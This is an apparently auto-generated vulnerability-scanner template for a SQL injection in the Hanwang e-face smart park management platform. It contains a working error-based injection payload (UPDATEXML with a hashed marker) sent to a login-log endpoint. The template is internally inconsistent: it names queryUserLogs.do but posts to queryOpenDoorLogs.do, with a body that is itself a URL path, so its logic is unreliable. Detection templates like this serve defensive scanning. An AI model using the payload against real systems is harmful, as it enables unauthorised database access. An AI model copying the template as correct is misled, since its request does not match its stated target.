id: poc-hw-e-face-pass-spmp-queryuserlogs-do-sqli

info:
  name: 汉王e脸通智慧园区管理平台 queryUserLogs.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in the 汉王e脸通智慧园区管理平台's queryUserLogs.do endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/manage/openDoorLog/queryOpenDoorLogs.do"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      /manage/systemLogMgr/queryUserLogs.do?branchId=1&columnKey=(UPDATEXML(2920,CONCAT(0x7e,{{t2}},0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "{{substr(t2,0,31)}}"
